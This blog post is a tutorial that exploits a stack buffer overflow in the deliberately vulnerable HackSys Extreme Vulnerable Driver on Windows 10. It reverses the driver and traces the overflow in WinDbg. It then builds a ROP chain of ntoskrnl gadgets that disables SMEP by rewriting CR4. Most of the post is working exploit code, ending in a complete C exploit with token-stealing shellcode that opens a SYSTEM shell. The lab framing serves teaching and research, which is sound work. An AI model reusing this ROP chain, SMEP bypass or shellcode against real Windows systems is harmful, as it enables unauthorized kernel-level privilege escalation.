---
title: HackSys Extreme Vulnerable Driver 3 - Stack Overflow + SMEP Bypass
date: 2022-05-14
tags: ["windows-kernel-exploitation"]
hide:
    - navigation
---

## Introduction

This post is a writeup of a simple Stack Buffer Overflow in HackSys Extreme Vulnerable Driver - we assume that you already have an environment setup to follow along. However, if you don't have an environment setup in this post we use:

- Windows 10 Pro x64 RS1
- HEVD 3.00

If you are not sure how to setup a kernel debugging environment you can find plenty of posts of the process online, we will not cover the process in this post.

<hr>

# Reversing the Driver

The first challenge we need to tackle is finding the IRP handler this will take the form of being a function with a huge switch case in it. Since HEVD is a relatively small driver it is quite easy to find. In larger drivers this can of course be more tricky but we won't cover that here.

## Locating the IRP Handler

The IRP handler in HEVDv3 is located at `sub_140085078` and as stated above the function is quite a large switch case which eventually leads to all of our different IOCTL handlers. The below image shows the graph overview of the IRP handler. We will refer to this handler function as `IrpDeviceIoCtlHandler` from this point onwards.

<figure markdown>
  ![graph](/assets/images/posts/hevd/irpiopctrlhandlergraph.png)
  <figcaption>IRP Handler Graph</figcaption>
</figure>

Now that we've located the IRP handler we can begin reversing.

## Locating the IOCTL Handler
In a real world scenario we would have to reverse each of these switched to functions to find a vulnerable one, in this case we know they're all vulnerable and I've already found the routine we are targetting in this blog post from doing a string search of "Buffer overflow". `loc_14008522F` is the entrypoint to our target function which is shown in the below figure.

<figure markdown>
  ![loc_14008522f](/assets/images/posts/hevd/loc_14008522f.png)
  <figcaption>Entrypoint to target function</figcaption>
</figure>

In the above image I've already renamed the IOCTL handler routine as `BufferOverflowStackIoctlHandler` (or `sub_140086594` if you're following along) Let's open the function and look at it in some more detail.

<figure markdown>
  ![BufferOverflowIoctlHandler](/assets/images/posts/hevd/BufferOverflowStackIoctlHandler.png)
  <figcaption>IOCTL Handler Function</figcaption>
</figure>

The target function is quite small because it calls into the vulnerable function, labelled as `TriggerBufferOverflowStack` in the above image (or `sub_1400865B4` if you're following along).

## Reversing the Vulnerable Function

Finally we've arrived in the vulnerable function and we can begin looking for the vulnerability. The below code block is the decompilation of the vulnerable function. *Its been cleaned up for readability*.

```C title="Vulnerable Function"
TriggerBufferOverflowStack(volatile void *Address, SIZE_T a2)
{
  char Dst[2048]; // (2)

  memset(Dst, 0, sizeof(Dst));
  ProbeForRead(Address, 0x800, 1);
  DbgPrintEx(0x4D, 3, "[+] UserBuffer: 0x%p\n", (const void *)Address);
  DbgPrintEx(0x4D, 3, "[+] UserBuffer Size: 0x%X\n", a2);
  DbgPrintEx(0x4D, 3, "[+] KernelBuffer: 0x%p\n", Dst);
  DbgPrintEx(0x4D, 3, "[+] KernelBuffer Size: 0x%X\n", 2048);
  DbgPrintEx(0x4D, 3, "[+] Triggering Buffer Overflow in Stack\n");
  RtlCopyMemory(Dst, (const void *)Address, a2); // (1)
  return 0;
}
```

1. There is no size check on the value of `a2` and since this value is controlled by us we can specify a size greater than 2048.
2. This is a statically allocated buffer of 2048 bytes in kernel mode. The size here is important.

The function itself is extremely simple, we have a stack allocated buffer `Dst` which is of size 2048 bytes. Then a [`ProbeForRead`](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-probeforread) is performed, this function checks that a user-mode buffer is present in the given address. So far so good.

Moving down the function we can see an [`RtlCopyMemory`](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlcopymemory) call the bright-eyed among you might notice the issue here straight away. If you're unfamilar `RtlCopyMemory` does exactly what you imagine, it copies a buffer from a source block to a destination block. 

We can see that our stack allocated buffer `Dst` is being used as the destination, the source is `Address` which is our user-mode buffer and the length of bytes to copy is specified by `a2`, however, at no point is there a check on whether the contents of `Address` fits inside `Dst` and thus if we can make our user-mode buffer greater than 2048 bytes we will have a classic stack buffer overflow. We can confirm the same story in the assembly view.

```C
0000000140086673 mov     r8, rsi             ; Length
0000000140086676 mov     rdx, rdi            ; Source
0000000140086679 lea     rcx, [rsp+838h+Dst] ; void *
000000014008667E call    RtlCopyMemory       ; Call Procedure
```

## Summary
To summarise the vulnerability is a classic stack buffer overflow due to a lack of size check on a copy from user-mode to a kernel-mode buffer. The vulnerable function has a stack allocated buffer of 2048 bytes - as long as we can provide a buffer greater than 2048 bytes then we will be able to overflow the buffer and gain stack control.

<hr>

# Dynamic Analysis
Now that we've found the vulnerability statically its time to try and prove that it is exploitable - to do that we're going to use WinDbg to step through the vulnerable function and verify that we can send a buffer greater than 2048 bytes and get stack control as a result.

## Interacting with the Driver
In order to begin dynamic analysis we'll need to build a way of interacting with the driver and sending it IOCTLs. You can use any language to do this but we're going to use C because:

1. It is really nice to use when working with Windows 
2. Python3 ctypes absolutely sucks for this kind of thing
3. Exploit portability

The below code block is a very simple C program to interact with the driver - if you're unfamilar with the Windows API then the two most important sections of code to be aware of are [`CreateFileA`](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) and [`DeviceIoControl`](https://docs.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol).

```C
#include <Windows.h>
#include <stdio.h>

#define DRIVER "\\\\.\\HacksysExtremeVulnerableDriver"

void exploit()
{
    HANDLE DriverHandle;
    DWORD  OldProtect;
    char   buffer[2048] = {0};

    printf("[*] Preparing exploit buffer!\n");
    /* Fill exploit buffer with As. */
    memset(buffer, 0x41, sizeof(buffer));

    printf("[*] Opening handle to %s\n", DRIVER);
    DriverHandle = CreateFileA(DRIVER, GENERIC_READ | GENERIC_WRITE, 0, NULL OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (DriverHandle == INVALID_HANDLE_VALUE) 
    {
        printf("[!] FATAL: Could not open HEVD handle!\n");
        return;
    }

    if (!DeviceIoControl(DriverHandle, 0x222003, buffer, sizeof(buffer), NULL, 0, NULL, NULL))
    {
        printf("[!] FATAL: Error sending IOCTL to driver!\n");
        return;
    }
}

int main()
{
    printf("[+] HEVD: Stack Buffer Overflow!\n");
    exploit();

    return 0;
}
```

For the purposes of debugging and explaining I imported the HEVD symbol file into WinDbg so that we can workaround ASLR.

???+ tip
    If you're following along I'd recommend that you do as above and import the HEVD symbol file into WinDbg.

## Verifying Input and Size
Remember in order to cause a buffer overflow we need to overflow the stack allocated buffer of 2048 bytes, to do this we need to confirm that we can give a size of more than this. If you recall the function `TriggerBufferOverflowStack` takes two arguments, a user-mode address where our buffer is stored and a size argument. If we set a breakpoint on `BufferOverflowStackIoctlHandler` we can step through to the call to the vulnerable function and check our given arguments validity.

```C
0: kd> bp HEVD!BufferOverflowStackIoctlHandler

0: kd> g
Breakpoint 0 hit
HEVD!BufferOverflowStackIoctlHandler:
fffff808`c1c16594 4883ec28        sub     rsp,28h

0: kd> p
HEVD!BufferOverflowStackIoctlHandler+0x4:
fffff808`c1c16598 488b4a20        mov     rcx,qword ptr [rdx+20h]

1: kd> p
HEVD!BufferOverflowStackIoctlHandler+0xd:
fffff808`c1c165a1 8b5210          mov     edx,dword ptr [rdx+10h]

1: kd> dq rcx
00000000`0061f6e8  41414141`41414141 41414141`41414141
00000000`0061f6f8  41414141`41414141 41414141`41414141
00000000`0061f708  41414141`41414141 41414141`41414141
00000000`0061f718  41414141`41414141 41414141`41414141
00000000`0061f728  41414141`41414141 41414141`41414141
00000000`0061f738  41414141`41414141 41414141`41414141
00000000`0061f748  41414141`41414141 41414141`41414141
00000000`0061f758  41414141`41414141 41414141`41414141

1: kd> dq rdx+10
ffffc58f`40f84dc0  00000000`00000800 00000000`00222003
[...]
```

The above figure shows clearly that we do have complete control of these arguments. The first instruction of interest is `HEVD!BufferOverflowStackIoctlHandler+0x4` where our user-mode address is moved from `rdx+20` into `rcx`. The next instruction of interest is immediately after at `HEVD!BufferOverflowStackIoctlHandler+0xd` where the size of our user-mode buffer is moved from `rdx+10` to `edx`. We then dump those arguments to verify.

<hr>

# Exploitation
Now that we've verified we control both arguments to the vulnerable function unconditionally we can move forward with gaining control of the return address.

## Gaining Control of the Return Address
In order to figure out where we gain control we can use a number of methods such as using a cylic pattern. 

```
┌──(kali㉿kali)-[~/Desktop]
└─$ msf-pattern_create -l 2100

┌──(kali㉿kali)-[~/Desktop]
└─$ msf-pattern_offset -l 2100 -q 4332724331724330 
[*] Exact match at offset 2072
```

Based on the above we see that we gain control of the return address at 2072 bytes. We'll update our code accordingly.

```C
void exploit()
{
    HANDLE DriverHandle;
    DWORD  OldProtect;
    char   buffer[2072 + 8] = {0};
    const size_t offset = 2072;

    printf("[*] Preparing exploit buffer!\n");
    /* Fill exploit buffer with As. */
    memset(buffer, 0x41, sizeof(buffer));
    
    memcpy(&buffer[offset], "BBBBBBBB", 8);
```

We can run our POC again and verify that we gain control of the return address as shown in the below.

```
0: kd> bp HEVD!TriggerBufferOverflowStack+0xca

0: kd> g
Breakpoint 0 hit
HEVD!TriggerBufferOverflowStack+0xca:
fffff80e`06fb667e e83dabf7ff      call    HEVD!memcpy (fffff80e`06f311c0)

1: kd> pt
HEVD!TriggerBufferOverflowStack+0x10b:
fffff80e`06fb66bf c3              ret

1: kd> k
 # Child-SP          RetAddr               Call Site
00 ffff8e81`165f67b8 42424242`42424242     HEVD!TriggerBufferOverflowStack+0x10b
01 ffff8e81`165f67c0 00000000`00000003     0x42424242`42424242
```

Perfect we now have control of the return address. However, we've not won yet. We have some exploit mitigations which need to be taken into consideration.

The first mitigation we need to circumvent is Supervisor Mode Execution Prevention (SMEP), this is a hardware mitigation that restricts code that resides in user-mode from being executed in ring0. In essence this prevents EoPs that rely on executing a user-mode payload.

## SMEP Bypass
There's a few ways we can bypass SMEP but the main one (and the one we're going to use) is to construct a ROP chain that reads the content of CR4 and then flips the 20th bit of the register - upon doing so SMEP will be disabled and we can simply jump to our user-mode payload. 

???+ Attention 
    In this example we are going to use APIs that are only available to medium (or higher) intgreity levels. Namely, `EnumDeviceDrivers`. In a lot of EoP cases we will be at low level integrity, not medium in these cases you'll need a leak to get the base address of kernel modules. [^1]

[^1]: In the future I will publish an article which explains that process in more detail. However in this example we're just going to use `EnumDeviceDrivers`.

First we'll create a new function in our C code called `GetKernelBase` this function itself is fairly simple, all it will do is make a call to `EnumDeviceDrivers` and then get the first item from the returned array the first item will be the base address for `ntoskrnl.exe`. *The below code only includes changes*.

```C
#include <Psapi.h>

unsigned long long GetKernelBase(void)
{

    LPVOID  lpImageBase[1024];
    DWORD   lpcbNeeded;

    /* Get base address of first driver (ntoskrnl.exe) */
    printf("[+] Obtaining Driver Base Address!\n");
    BOOL DriversBase = EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);
    if (!DriversBase)
    {
        printf("[!] FATAL: Error enumerating device drivers!\n");
        exit(1);
    }

    /* Get name of first driver (ntoskrnl.exe) */
    char BaseName[1024] = {0};
    BOOL DriversBaseName = GetDeviceDriverBaseNameA(lpImageBase[0], BaseName, sizeof(BaseName));
    if (!DriversBaseName)
    {
        printf("[!] FATAL: Error getting drivers base name!\n");
        exit(1);
    }

    /* 
     * ntoskrnl.exe is the first module in lpImageBase.
     * typecast LPVOID -> unsigned long long
    */
    unsigned long long KernelBase = (unsigned long long)lpImageBase[0];

    printf("[*] Driver base name is: %s", BaseName);
    printf("[*] %s is located at: 0x%x\n", BaseName, KernelBase);

    return KernelBase;

}
```

As you can see it is very easy to get the base address of the kernel and other drivers providing that you have access to the `EnumDeviceDrivers` call. But, we're not done here. We still need to build our ROP chain to flip the 20th bit of the CR4 register.

The ROP chain itself is fairly simple, we simply need to pop our inteded CR4 value into a register and then move the contents of that register into the CR4 register thus turning off SMEP. To find gadgets we can use something such as RP++. In my case I found the below gadgets in `ntoskrnl.exe`.

```title="Gadgets for SMEP bypass"
0x1406a0a51: pop rcx ; ret     
0x1409a41e3: mov cr4, rcx ; ret
```

Now that we've got the gadgets to use we need to update our exploit to place those gadgets in the buffer at the point we control the return address so that when we return we start our ROP chain to disable SMEP.

```C title="Updated code to include SMEP bypass"
    char buffer[2100] = {0};

    unsigned long long BaseAddress = GetKernelBase();

    unsigned long long ROP1 = BaseAddress + 0x6a0a51;   // 0x1406a0a51: pop rcx ; ret      : ntoskrnl.exe
    unsigned long long ROP2 = 0x70678;                  // Updated CR4
    unsigned long long ROP3 = BaseAddress + 0x9a41e3;   // 0x1409a41e3: mov cr4, rcx ; ret : ntoskrnl.exe

    /* Fill exploit buffer with As. */
    memset(buffer, 0x41, sizeof(buffer));

    printf("[+] Beginning ROP chain to disable SMEP!\n");
    memcpy(&buffer[2072], &ROP1, GadgetSize);
    memcpy(&buffer[2072+8], &ROP2, GadgetSize);
    memcpy(&buffer[2072+16], &ROP3, GadgetSize);
    printf("[*] SMEP should now be disabled!\n");
```

If you're wondering why we choose the value `0x70678` to be the new value for CR4 this is because in binary this value is `1110000011001111000` which makes the 20th bit 0, which is the bit for SMEP. Let's go ahead and trace the execution in a debugger and ensure that the 20th bit of CR4 is getting correctly set to 0 to disable SMEP.

```asm title="Bypassing SMEP"
0: kd> bp HEVD!TriggerBufferOverflowStack+0xca

0: kd> g
Breakpoint 0 hit
HEVD!TriggerBufferOverflowStack+0xca:
fffff805`87e8667e e83dabf7ff      call    HEVD!memcpy (fffff805`87e011c0)

1: kd> p
HEVD!TriggerBufferOverflowStack+0xcf:
fffff805`87e86683 eb1b            jmp     HEVD!TriggerBufferOverflowStack+0xec (fffff805`87e866a0)

[...] /* (2) */

1: kd> p
HEVD!TriggerBufferOverflowStack+0x10b:
fffff805`87e866bf c3              ret

1: kd> p
nt!HvCheckBin+0xe1:
fffff805`820a0a51 59              pop     rcx

1: kd> p
nt!HvCheckBin+0xe2:
fffff805`820a0a52 c3              ret

1: kd> r
rax=0000000000000000 rbx=0000000000070678 rcx=0000000000070678 /* (1) */
rdx=0000467ddeabe610 rsi=fffff805823a41e3 rdi=0000000041414141
rip=fffff805820a0a52 rsp=ffffb98221b417a8 rbp=ffffe58cd6bfdcd0
 r8=0000000000000000  r9=0000000000000000 r10=fffff80587e85078
r11=ffffb98221b41780 r12=4141414141414141 r13=0000000000000000
r14=4141414141414141 r15=4141414141414141
iopl=0         nv up ei pl zr na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246

nt!HvCheckBin+0xe2:
fffff805`820a0a52 c3              ret

1: kd> p
nt!KiEnableXSave+0xb53f:
fffff805`823a41e3 0f22e1          mov     tmm,rcx

1: kd> p
nt!KiEnableXSave+0xb542:
fffff805`823a41e6 c3              ret

1: kd> r cr4
cr4=0000000000070678
```

1. Pay attention to the value in RCX here.
2. This denotes excluded instructions. It isn't important.


As you can see in the above output from WinDbg we **set a breakpoint on the memcpy** then we step through the program until the return, at the return we can clearly see that our `pop rcx` gadget is executed and then the value `70678` is placed in the RCX register. If we continue stepping we then see that value being written into the CR4 register thus allowing us to bypass SMEP. All that's left for us to do now is to allocate some space in user land, fill it with shellcode and get a system shell.

I'll leave this part for you to do based on whatever build of Windows you're on. I'm on RS1 in this post so I used a well known shellcode (got it from [here](https://github.com/connormcgarr/Kernel-Exploits/blob/master/HEVD/Stack%20Overflow/Windows10_StackOverflow.c) thanks Conor :smile:) which loops over processes and does a comparison between the current PID vs the SYSTEM PID until the SYSTEM PID is found. 

<hr>

# Final Exploit 

You can find my full exploit below. Or scroll down to open it on GitHub. Thanks for reading!

```C title="Final Exploit"
#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>

#define DRIVER "\\\\.\\HacksysExtremeVulnerableDriver"
#define IOCTL_CODE 0x222003

unsigned long long GetKernelBase(void)
{

    LPVOID  lpImageBase[1024];
    DWORD   lpcbNeeded;

    /* Get base address of first driver (ntoskrnl.exe) */
    printf("[+] Obtaining Driver Base Address!\n");
    BOOL DriversBase = EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);
    if (!DriversBase)
    {
        printf("[!] FATAL: Error enumerating device drivers!\n");
        exit(1);
    }

    /* Get name of first driver (ntoskrnl.exe) */
    char BaseName[1024] = {0};
    BOOL DriversBaseName = GetDeviceDriverBaseNameA(lpImageBase[0], BaseName, sizeof(BaseName));
    if (!DriversBaseName)
    {
        printf("[!] FATAL: Error getting drivers base name!\n");
        exit(1);
    }

    /* 
     * ntoskrnl.exe is the first module in lpImageBase.
     * typecast LPVOID -> unsigned long long
    */
    unsigned long long KernelBase = (unsigned long long)lpImageBase[0];

    printf("[*] Driver base name is: %s\n", BaseName);
    printf("[*] %s is located at: 0x%p\n", BaseName, KernelBase);

    return KernelBase;

}

unsigned long long CreateShellcode(void)
{
    /*
		_start:
			mov rax, [gs:0x188]		    ; Current thread (_KTHREAD)
			mov rax, [rax + 0xb8]		; Current process (_EPROCESS)
			mov rbx, rax			    ; Copy current process (_EPROCESS) to rbx
		__loop:
			mov rbx, [rbx + 0x2f0] 		; ActiveProcessLinks
			sub rbx, 0x2f0		   	    ; Go back to current process (_EPROCESS)
			mov rcx, [rbx + 0x2e8] 		; UniqueProcessId (PID)
			cmp rcx, 4 			        ; Compare PID to SYSTEM PID 
			jnz __loop			        ; Loop until SYSTEM PID is found
			mov rcx, [rbx + 0x358]		; SYSTEM token is @ offset _EPROCESS + 0x358
			and cl, 0xf0			    ; Clear out _EX_FAST_REF RefCnt
			mov [rax + 0x358], rcx		; Copy SYSTEM token to current process
			add rsp, 0x40			    ; Restore execution
			ret	
	*/
	
	// Windows 10 RS1 offsets in _EPROCESS structure
	char payload[] = "\x65\x48\x8B\x04\x25\x88\x01\x00\x00\x48\x8B\x80"
			         "\xB8\x00\x00\x00\x48\x89\xC3\x48\x8B\x9B\xF0"
			         "\x02\x00\x00\x48\x81\xEB\xF0\x02\x00\x00\x48"
			         "\x8B\x8B\xE8\x02\x00\x00\x48\x83\xF9\x04"
			         "\x75\xE5\x48\x8B\x8B\x58\x03\x00\x00\x80"
			         "\xE1\xF0\x48\x89\x88\x58\x03\x00\x00\x48"
			         "\x83\xC4\x40\xC3";

    /* Allocate shellcode in user mode */
    LPVOID shellcode = VirtualAlloc(NULL, sizeof(payload), 0x3000, 0x40);
    if (!shellcode)
    {
        printf("[-] FATAL: Unable to allocate shellcode!\n");
        exit(1);
    }
    printf("[+] Shellcode allocated at: 0x%p\n", shellcode);

    /* Move allocated space in user mode */
    BOOL MoveMem = RtlMoveMemory(shellcode, payload, sizeof(payload));
    if(!MoveMem)
    {
        printf("[-] FATAL: Unable to move shellcode into allocated memory!\n");
    }

    unsigned long long ShellcodeBase = (unsigned long long)shellcode;
    return ShellcodeBase;
}

void exploit(void)
{
    HANDLE  DriverHandle;
    DWORD   OldProtect;
    char    buffer[2100] = {0};

    unsigned long long BaseAddress = GetKernelBase();
    unsigned long long shellcode = CreateShellcode();

    unsigned long long ROP1 = BaseAddress + 0x6a0a51;   // 0x1406a0a51: pop rcx ; ret      : ntoskrnl.exe
    unsigned long long ROP2 = 0x70678;                  // Updated CR4
    unsigned long long ROP3 = BaseAddress + 0x9a41e3;   // 0x1409a41e3: mov cr4, rcx ; ret : ntoskrnl.exe

    /* Fill exploit buffer with As. */
    memset(buffer, 0x41, sizeof(buffer));

    printf("[+] Beginning ROP chain to disable SMEP!\n");
    memcpy(&buffer[2072], &ROP1, 8);
    memcpy(&buffer[2072+8], &ROP2, 8);
    memcpy(&buffer[2072+16], &ROP3, 8);
    printf("[*] SMEP should now be disabled!\n");

    memcpy(&buffer[2072+24], &shellcode, 8);
    printf("[+] Executing shellcode!\n");

    printf("[*] Opening handle to %s\n", DRIVER);
    DriverHandle = CreateFileA(DRIVER, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (DriverHandle == INVALID_HANDLE_VALUE) 
    {
        printf("[!] FATAL: Could not open HEVD handle!\n");
        return;
    }

    if (!DeviceIoControl(DriverHandle, IOCTL_CODE, buffer, sizeof(buffer), NULL, 0, NULL, NULL))
    {
        printf("[!] FATAL: Error sending IOCTL to driver!\n");
        return;
    }

}

int main()
{
    printf("[+] HEVD: Stack Buffer Overflow!\n");
    exploit();

    system("cmd.exe /c cmd.exe /K cd C:\\");
    printf("[*] 1337 System Shell Bozo");

    return 0;
}
```

[Exploit on :fontawesome-brands-github: ](https://github.com/LinxzSec/Kernel-Exploits/blob/main/HEVD/StackOverflow64.c){.md-button .md-button--primary }

--8<-- "includes/abbreviations.md"